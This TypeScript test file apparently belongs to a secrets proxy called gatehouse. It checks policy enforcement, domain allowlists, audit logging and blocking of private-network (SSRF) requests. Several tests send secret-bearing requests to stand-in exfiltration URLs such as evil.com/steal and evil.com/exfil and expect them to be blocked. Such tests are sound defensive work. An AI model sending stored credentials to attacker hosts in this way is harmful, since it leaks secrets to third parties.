import { describe, test, expect, beforeEach, afterEach, mock } from "bun:test";
import { Database } from "bun:sqlite";
import { Hono } from "hono";
import { initDB } from "../src/db/init";
import { SecretsEngine } from "../src/secrets/engine";
import { PolicyEngine } from "../src/policy/engine";
import { AuditLog } from "../src/audit/logger";
import { proxyRouter } from "../src/api/proxy";
import { mkdtempSync, rmSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

describe("Proxy Router", () => {
  let db: Database;
  let secrets: SecretsEngine;
  let policies: PolicyEngine;
  let audit: AuditLog;
  let app: Hono;
  let dir: string;
  let configDir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "gatehouse-proxy-test-"));
    configDir = join(dir, "config", "policies");
    mkdirSync(configDir, { recursive: true });

    db = initDB(dir);
    secrets = new SecretsEngine(db, Buffer.from("a".repeat(64), "hex"));
    policies = new PolicyEngine(join(dir, "config"), db);
    audit = new AuditLog(db);

    // Create a test policy with proxy capability
    policies.savePolicy("proxy-agent", [
      { paths: ["api-keys/*"], capabilities: ["proxy"] },
      { paths: ["db/*"], capabilities: ["read"] }, // read but NOT proxy
    ]);

    // Seed some secrets
    secrets.put("api-keys/openai", "sk-test-openai-key-123");
    secrets.put("api-keys/anthropic", "sk-ant-test-key-456");
    secrets.put("db/postgres", "postgres://user:pass@localhost:5432/db");

    // Set up metadata with domain allowlist
    secrets.put("api-keys/openai", "sk-test-openai-key-123", {
      allowed_domains: "api.openai.com,openai.com",
    });

    app = new Hono();

    // Simulate auth middleware
    app.use("*", async (c, next) => {
      c.set("requestId", "test-req-id");
      c.set("sourceIp", "127.0.0.1");
      // Default to proxy-agent policy; tests can override via header
      const policyHeader = c.req.header("X-Test-Policies");
      const policies = policyHeader
        ? JSON.parse(policyHeader)
        : ["proxy-agent"];
      c.set("auth", {
        identity: "test-agent",
        policies,
      });
      await next();
    });

    app.route("/v1/proxy", proxyRouter(secrets, policies, audit));
  });

  afterEach(() => {
    db.close();
    rmSync(dir, { recursive: true, force: true });
  });

  // ── Validation tests ──────────────────────────────────────────

  test("rejects missing url", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ method: "GET" }),
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("url is required");
  });

  test("rejects missing method", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: "https://example.com" }),
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("method is required");
  });

  test("rejects unsupported method", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/{{secret:api-keys/openai}}",
        method: "CONNECT",
      }),
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("Unsupported method");
  });

  test("rejects request with no secret references", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "GET",
      }),
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("No secret references found");
  });

  test("rejects invalid JSON body", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "not json",
    });
    expect(res.status).toBe(400);
  });

  // ── Policy enforcement tests ──────────────────────────────────

  test("denies proxy when policy lacks proxy capability", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Test-Policies": JSON.stringify(["proxy-agent"]),
      },
      body: JSON.stringify({
        url: "https://db.example.com",
        method: "GET",
        headers: {
          Authorization: "{{secret:db/postgres}}",
        },
      }),
    });
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toContain("no proxy capability");
  });

  test("denies proxy when policy doesn't match path at all", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Test-Policies": JSON.stringify(["proxy-agent"]),
      },
      body: JSON.stringify({
        url: "https://example.com",
        method: "GET",
        headers: {
          Authorization: "{{secret:unknown/path}}",
        },
      }),
    });
    expect(res.status).toBe(403);
  });

  test("allows proxy with admin policy", async () => {
    // Admin policy has proxy capability on *
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Test-Policies": JSON.stringify(["admin"]),
      },
      body: JSON.stringify({
        url: "https://api.openai.com/v1/models",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/openai}}",
        },
      }),
    });
    // Should not be 403 — it'll either succeed or fail on the upstream call
    expect(res.status).not.toBe(403);
  });

  // ── Secret resolution tests ───────────────────────────────────

  test("returns 404 for nonexistent secret", async () => {
    // Save a policy that grants proxy on the path
    policies.savePolicy("proxy-agent", [
      { path: "api-keys/*", capabilities: ["proxy"] },
      { path: "missing/*", capabilities: ["proxy"] },
    ]);

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com",
        method: "GET",
        headers: {
          Authorization: "{{secret:missing/key}}",
        },
      }),
    });
    expect(res.status).toBe(404);
    const body = await res.json();
    expect(body.error).toContain("Secret not found");
  });

  // ── Domain allowlist tests ────────────────────────────────────

  test("blocks request to disallowed domain", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://evil.com/steal",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/openai}}",
        },
      }),
    });
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toContain("not in the allowed domains");
  });

  test("allows request to permitted domain", async () => {
    // This will actually try to call api.openai.com and likely fail/timeout,
    // but it should NOT return 403
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://api.openai.com/v1/models",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/openai}}",
        },
        timeout: 2000,
      }),
    });
    // Could be 200 (unlikely without real key), 502, or 504 — but NOT 403
    expect(res.status).not.toBe(403);
  });

  test("allows any domain when no allowed_domains metadata", async () => {
    // anthropic key has no domain restriction
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://any-domain.example.com/api",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/anthropic}}",
        },
        timeout: 2000,
      }),
    });
    // Should not be 403
    expect(res.status).not.toBe(403);
  });

  // ── Audit logging tests ───────────────────────────────────────

  test("logs proxy attempts to audit log", async () => {
    // This will try to hit the network and probably fail, but should still audit
    await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://api.openai.com/v1/models",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/openai}}",
        },
        timeout: 2000,
      }),
    });

    const logs = audit.query({ action: "proxy.forward" });
    expect(logs.length).toBeGreaterThan(0);
    expect(logs[0].identity).toBe("test-agent");
    expect(logs[0].action).toBe("proxy.forward");
  });

  test("logs policy denial to audit log", async () => {
    await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com",
        method: "GET",
        headers: {
          Authorization: "{{secret:db/postgres}}",
        },
      }),
    });

    const logs = audit.query({ action: "proxy.forward" });
    const denial = logs.find((l) => !l.success);
    expect(denial).toBeDefined();
    expect(denial!.metadata.reason).toBe("policy_denied");
  });

  test("logs domain block to audit log", async () => {
    await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://evil.com/exfil",
        method: "GET",
        headers: {
          Authorization: "Bearer {{secret:api-keys/openai}}",
        },
      }),
    });

    const logs = audit.query({ action: "proxy.forward" });
    const blocked = logs.find(
      (l) => !l.success && l.metadata.reason === "domain_blocked"
    );
    expect(blocked).toBeDefined();
  });

  // ── Multiple secret refs ──────────────────────────────────────

  test("resolves multiple secret references", async () => {
    // Both secrets need proxy capability
    policies.savePolicy("proxy-agent", [
      { path: "api-keys/*", capabilities: ["proxy"] },
    ]);

    // Remove domain restriction from openai for this test
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "POST",
        headers: {
          "X-OpenAI-Key": "{{secret:api-keys/openai}}",
          "X-Anthropic-Key": "{{secret:api-keys/anthropic}}",
        },
        timeout: 2000,
      }),
    });
    // Should resolve both secrets — not a 404 or 403
    expect(res.status).not.toBe(403);
    expect(res.status).not.toBe(404);
  });

  // ── Secret ref in body ────────────────────────────────────────

  test("resolves secret references in string body", async () => {
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: "key={{secret:api-keys/openai}}",
        timeout: 2000,
      }),
    });
    expect(res.status).not.toBe(400);
    expect(res.status).not.toBe(404);
  });

  test("resolves secret references in JSON body", async () => {
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "POST",
        body: { apiKey: "{{secret:api-keys/openai}}" },
        timeout: 2000,
      }),
    });
    expect(res.status).not.toBe(400);
    expect(res.status).not.toBe(404);
  });

  // ── Inject shorthand ──────────────────────────────────────────

  test("inject shorthand resolves secrets into headers", async () => {
    // Remove domain restriction for this test
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://api.openai.com/v1/models",
        method: "GET",
        inject: {
          Authorization: "api-keys/openai",
        },
        timeout: 2000,
      }),
    });
    // Should not be 400 (no refs) or 403 (policy denied)
    expect(res.status).not.toBe(400);
    expect(res.status).not.toBe(403);
  });

  test("inject shorthand auto-prefixes Bearer for Authorization", async () => {
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://api.openai.com/v1/models",
        method: "GET",
        inject: {
          Authorization: "api-keys/openai",
        },
        timeout: 2000,
      }),
    });
    // If it reached the upstream, it sent "Bearer sk-test-openai-key-123"
    expect(res.status).not.toBe(400);
  });

  test("inject shorthand does NOT double-prefix Bearer", async () => {
    // Store a value that already has Bearer prefix
    secrets.put("api-keys/prefixed", "Bearer sk-already-prefixed");
    policies.savePolicy("proxy-agent", [
      { path: "api-keys/*", capabilities: ["proxy"] },
    ]);

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "GET",
        inject: {
          Authorization: "api-keys/prefixed",
        },
        timeout: 2000,
      }),
    });
    expect(res.status).not.toBe(400);
  });

  test("inject shorthand checks policy", async () => {
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com",
        method: "GET",
        inject: {
          Authorization: "db/postgres",
        },
      }),
    });
    expect(res.status).toBe(403);
  });

  test("inject shorthand checks domain allowlist", async () => {
    // openai key has allowed_domains: api.openai.com,openai.com
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://evil.com/steal",
        method: "GET",
        inject: {
          Authorization: "api-keys/openai",
        },
      }),
    });
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toContain("not in the allowed domains");
  });

  test("inject and template can be combined", async () => {
    secrets.put("api-keys/openai", "sk-test-openai-key-123");

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: "https://example.com/api",
        method: "POST",
        inject: {
          Authorization: "api-keys/openai",
        },
        headers: {
          "X-Custom": "{{secret:api-keys/anthropic}}",
        },
        timeout: 2000,
      }),
    });
    expect(res.status).not.toBe(400);
    expect(res.status).not.toBe(404);
  });

  // ── Auto-inject tests ──────────────────────────────────────────

  test("auto_inject uses metadata.header_name to set header", async () => {
    // Set up a secret with header_name metadata
    secrets.put("api-keys/anthropic", "sk-ant-test-key-456", {
      header_name: "x-api-key",
      allowed_domains: "api.anthropic.com",
    });

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: "GET",
        url: "https://api.anthropic.com/v1/models",
        auto_inject: ["api-keys/anthropic"],
      }),
    });
    // Will fail to connect to external API in tests, but should not be 400
    expect(res.status).not.toBe(400);
  });

  test("auto_inject rejects secret without header_name metadata", async () => {
    // api-keys/openai has allowed_domains but no header_name
    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: "GET",
        url: "https://api.openai.com/v1/models",
        auto_inject: ["api-keys/openai"],
      }),
    });
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toContain("header_name");
  });

  // ── Private network allow tests ──────────────────────────────────

  test("private network blocked by default", async () => {
    secrets.put("api-keys/internal", "internal-key", {});
    policies.savePolicy("proxy-agent", [
      { paths: ["api-keys/*"], capabilities: ["proxy"] },
    ]);

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: "GET",
        url: "http://192.168.1.100/api",
        inject: { Authorization: "api-keys/internal" },
      }),
    });
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toContain("private");
  });

  test("private network allowed via secret metadata allow_private=true", async () => {
    secrets.put("api-keys/homelab", "homelab-token", {
      allow_private: "true",
    });
    policies.savePolicy("proxy-agent", [
      { paths: ["api-keys/*"], capabilities: ["proxy"] },
    ]);

    const res = await app.request("/v1/proxy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: "GET",
        url: "http://192.168.1.100/api",
        inject: { Authorization: "api-keys/homelab" },
        timeout: 500, // short timeout — host won't exist in test env
      }),
    });
    // Should pass SSRF check (502/504 from connection failure, NOT 403)
    expect(res.status).not.toBe(403);
    expect([502, 504]).toContain(res.status);
  });
});
